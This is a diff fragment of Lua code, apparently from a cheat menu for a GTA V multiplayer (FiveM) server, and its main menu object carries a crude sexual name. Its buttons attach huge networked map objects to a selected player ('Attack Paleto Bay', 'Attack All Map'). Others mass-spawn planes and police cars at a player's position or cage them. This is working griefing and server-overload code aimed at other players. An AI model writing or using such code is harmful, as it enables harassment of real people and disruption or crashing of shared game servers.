+                                        local hamburg = "ar_prop_ar_cp_tower8x_01a"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "stt_prop_stunt_track_start"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "stt_prop_stunt_tube_m"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "ar_prop_ar_arrow_wide_xl"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "ar_prop_ar_neon_gate4x_01a"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "prop_container_01a"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "ap1_lod_slod4"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "csx_seabed_rock3_"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "prop_cj_big_boat"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "cs4_lod_01_slod3"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "dt1_lod_f1_slod3"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "dt1_21_reflproxy"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "dt1_props_combo0110_slod"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "dt1_11_slod1"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "sc1_08_hdg1"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "ss1_11_slod"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "ar_prop_ar_bblock_huge_05"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "ar_prop_ar_neon_gate4x_03a"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "ar_prop_ar_tube_2x_speed"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                        local hamburg = "apa_mp_apa_yacht_option2"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+
+			elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Paleto Bay') then
+                                        local hamburg = "cs1_lod2_01_7_slod3"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+			elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Tower 8X') then
+                                        local hamburg = "ar_prop_ar_cp_tower8x_01a"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Wall') then
+                    local hamburg = "stt_prop_stunt_track_start"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Tube') then
+                    local hamburg = "stt_prop_stunt_tube_m"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Arrow') then
+                    local hamburg = "ar_prop_ar_arrow_wide_xl"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Gat 4X') then
+                    local hamburg = "ar_prop_ar_neon_gate4x_01a"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Contanier') then
+                    local hamburg = "prop_container_01a"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~AirPort') then
+                    local hamburg = "ap1_lod_slod4"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+					elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Sea Rock') then
+										local hamburg = "csx_seabed_rock3_"
+                                        local hamburghash = GetHashKey(hamburg)
+                                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                    AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                                elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Boat') then
+                                    local hamburg = "prop_cj_big_boat"
+                                    local hamburghash = GetHashKey(hamburg)
+                                    local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                            elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Sandy Shores Map') then
+                                local hamburg = "cs4_lod_01_slod3"
+                                local hamburghash = GetHashKey(hamburg)
+                                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                        elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Los Santos City') then
+                            local hamburg = "dt1_lod_f1_slod3"
+                            local hamburghash = GetHashKey(hamburg)
+                            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                    elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~All Map') then
+                        local hamburg = "dt1_21_reflproxy"
+                        local hamburghash = GetHashKey(hamburg)
+                        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                    AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+                elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~FBI') then
+                    local hamburg = "dt1_props_combo0110_slod"
+                    local hamburghash = GetHashKey(hamburg)
+                    local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+                AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+            elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~MazeBank') then
+                local hamburg = "dt1_11_slod1"
+                local hamburghash = GetHashKey(hamburg)
+                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+            AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+        elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Hospital') then
+            local hamburg = "sc1_08_hdg1"
+            local hamburghash = GetHashKey(hamburg)
+            local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+        AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+    elseif IhadSexWithMyStepMother.Button('~r~Attack ~s~Rich House') then
+        local hamburg = "ss1_11_slod"
+        local hamburghash = GetHashKey(hamburg)
+        local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
+    AttachEntityToEntity(hamburger, GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
+							
+			elseif IhadSexWithMyStepMother.Button('~b~Spawn ~s~Big Heli 20x') then
+                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 1, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 2, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 3, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 4, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 5, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 6, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 7, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 8, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 9, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 10, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 11, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 12, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 13, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 14, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 15, 0)
+                    local pickup = CreateObject(GetHashKey('avenger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('avenger'), 16, 0)
+                    SetPickupRegenerationTime(pickup, 60)
+                elseif IhadSexWithMyStepMother.Button('~b~Spawn ~s~Cars 20x') then
+                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                    local pickup = CreateObject(GetHashKey('exemplar'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('exemplar'), 1, 0)
+                    local pickup = CreateObject(GetHashKey('windsor2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('windsor2'), 2, 0)
+                    local pickup = CreateObject(GetHashKey('jackal'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('jackal'), 3, 0)
+                    local pickup = CreateObject(GetHashKey('oracle'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('oracle'), 4, 0)
+                    local pickup = CreateObject(GetHashKey('blista'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('blista'), 5, 0)
+                    local pickup = CreateObject(GetHashKey('prairie'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('prairie'), 6, 0)
+                    local pickup = CreateObject(GetHashKey('felon2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('felon2'), 7, 0)
+                    local pickup = CreateObject(GetHashKey('riot'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('riot'), 8, 0)
+                    local pickup = CreateObject(GetHashKey('riot2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('riot2'), 9, 0)
+                    local pickup = CreateObject(GetHashKey('ambulance'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('ambulance'), 10, 0)
+                    local pickup = CreateObject(GetHashKey('firetruk'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('firetruk'), 11, 0)
+                    local pickup = CreateObject(GetHashKey('pbus'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('pbus'), 12, 0)
+                    local pickup = CreateObject(GetHashKey('chino'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('chino'), 13, 0)
+                    local pickup = CreateObject(GetHashKey('chino2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('chino2'), 14, 0)
+                    local pickup = CreateObject(GetHashKey('moonbeam2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('moonbeam2'), 15, 0)
+                    local pickup = CreateObject(GetHashKey('imperator'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('imperator'), 16, 0)
+                    SetPickupRegenerationTime(pickup, 60)
+			elseif IhadSexWithMyStepMother.Button('~b~Spawn ~s~Another Big Plane 20x') then
+                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 1, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 2, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 3, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 4, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 5, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 6, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 7, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 8, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 9, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 10, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 11, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 12, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 13, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 14, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 15, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 16, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 17, 0)
+                    local pickup = CreateObject(GetHashKey('bombushka'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('bombushka'), 18, 0)
+                    SetPickupRegenerationTime(pickup, 60)
+			elseif IhadSexWithMyStepMother.Button('~b~Spawn ~s~Cargoplane 20x') then
+                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                    local pickup = CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 1, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 1, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 2, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 3, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 4, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 5, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 6, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 7, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 8, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 1, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 1, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 11, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 12, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 13, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 14, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 15, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 16, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 17, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 18, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 19, 0)
+                    CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 20, 0)
+                    SetPickupRegenerationTime(pickup, 60)
+                elseif IhadSexWithMyStepMother.Button('~b~Spawn ~s~Police Cars 20x') then
+                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
+                    local pickup = CreateObject(GetHashKey('cargoplane'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('cargoplane'), 1, 0)
+                    CreateObject(GetHashKey('ambulance'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('ambulance'), 1, 0)
+                    CreateObject(GetHashKey('fbi'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('fbi'), 2, 0)
+                    CreateObject(GetHashKey('fbi2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('fbi2'), 3, 0)
+                    CreateObject(GetHashKey('firetruk'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('firetruk'), 4, 0)
+                    CreateObject(GetHashKey('lguard'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('lguard'), 5, 0)
+                    CreateObject(GetHashKey('pbus'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('pbus'), 6, 0)
+                    CreateObject(GetHashKey('police'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('police'), 7, 0)
+                    CreateObject(GetHashKey('police2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('police2'), 8, 0)
+                    CreateObject(GetHashKey('police3'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('police3'), 1, 0)
+                    CreateObject(GetHashKey('police4'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('police4'), 1, 0)
+                    CreateObject(GetHashKey('policeb'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('policeb'), 11, 0)
+                    CreateObject(GetHashKey('polmav'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('polmav'), 12, 0)
+                    CreateObject(GetHashKey('policeold1'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('policeold1'), 13, 0)
+                    CreateObject(GetHashKey('policeold2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('policeold2'), 14, 0)
+                    CreateObject(GetHashKey('policet'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('policet'), 15, 0)
+                    CreateObject(GetHashKey('pranger'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('pranger'), 16, 0)
+                    CreateObject(GetHashKey('predator'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('predator'), 17, 0)
+                    CreateObject(GetHashKey('riot'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('riot'), 18, 0)
+                    CreateObject(GetHashKey('sheriff'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('sheriff'), 19, 0)
+                    CreateObject(GetHashKey('sheriff2'), bK.x, bK.y, bK.z + 0.0, 1, 1, GetHashKey('sheriff2'), 20, 0)
+                    SetPickupRegenerationTime(pickup, 60)
+			 elseif IhadSexWithMyStepMother.Button('~r~Cage ~s~Player') then
+                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
+                    roundx = tonumber(string.format('%.2f', x))
+                    roundy = tonumber(string.format('%.2f', y))
+                    roundz = tonumber(string.format('%.2f', z))
+                    local e7 = 'prop_fnclink_05crnr1'
+                    local e8 = GetHashKey(e7)
+                    RequestModel(e8)
